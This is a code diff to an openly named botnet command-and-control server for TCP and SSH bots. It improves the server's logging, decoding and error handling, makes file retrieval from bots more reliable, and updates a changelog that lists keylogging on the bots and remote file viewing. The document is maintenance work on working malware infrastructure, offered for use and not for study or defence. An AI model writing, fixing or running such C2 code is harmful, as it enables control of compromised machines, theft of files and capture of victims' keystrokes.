@@ -437,8 +437,16 @@ TCP and SSH Botnet Hybrid Command and Control Server By DrSquid"""
             self.serverlog.write(contents)
             self.serverlog.write(msg)
             self.serverlog.close()
-        except:
+        except FileNotFoundError:
             self.serverlog = open(self.logfile, "w")
+            self.serverlog.write(msg)
+            self.serverlog.close()
+        except:
+            self.serverlog = open(self.logfile, 'rb')
+            contents = self.serverlog.read()
+            self.serverlog.close()
+            self.serverlog = open(self.logfile, 'wb')
+            self.serverlog.write(contents)
             self.serverlog.write(msg)
             self.serverlog.close()
     def wrap_item(self, word,size):
@@ -500,6 +508,7 @@ ________________________________________________________
                     try:
                         msg = msg.decode()
                     except Exception as e:
+                        msg = str(msg)
                         self.log(f"\n[(ERROR)]: {str(e)}")
                 if not isbot:
                     if msg == "!CLIENTLOG":
@@ -679,8 +688,11 @@ ________________________________________________________
                     pass
                 else:
                     if self.savefile:
-                        if msg.decode() == "finished":
-                            savefile = False
+                        try:
+                            if msg.decode() == "finished":
+                                savefile = False
+                        except:
+                            pass
                         filenames = f"{number}{self.botfile}"
                         file_created = False
                         try:
@@ -725,7 +737,7 @@ ________________________________________________________
                             except Exception as e:
                                 self.log(f"\n[(ERROR)]: Unable to send msg to: {adminconn}.")
             except Exception as e:
-                if "a bytes-like object is required, not 'str'" in str(e) or "An operation was attempted on something that is not a socket" in str(e):
+                if "a bytes-like object is required, not 'str'" in str(e) or "An operation was attempted on something that is not a socket" in str(e) or "startswith first arg must be bytes or a tuple of bytes, not str" in str(e):
                     self.log(f"\n[(ERROR)]: Ignoring Error {e} in {hostname}")
                 else:
                     self.log(f"\n[(ERROR)]: {hostname} seems defective(Error: {e}).\n[(CLOSECONN)]: Closing connection....")
@@ -1044,6 +1056,8 @@ ________________________________________________________
 [+] - Added '!kick' and '!togglelisten'
 [+] - Added Keylogging to the bots.
 [+] - Added display message when there is an error with binding the server.
+[+] - Fixed bug that kicks bots when wanting to view content from a file remotely.
+[+] - Improved Logging Function.
                     """)
                 if "!clear" in self.instruction.strip() or "!genscript" in self.instruction.strip() or "!genadminscript".strip() in self.instruction.strip() or "!whatsnew" in self.instruction.strip() or "!getconninfo" in self.instruction.strip() or "listsshbots" in self.instruction.strip() or "!togglelisten" in self.instruction.strip():
                     pass
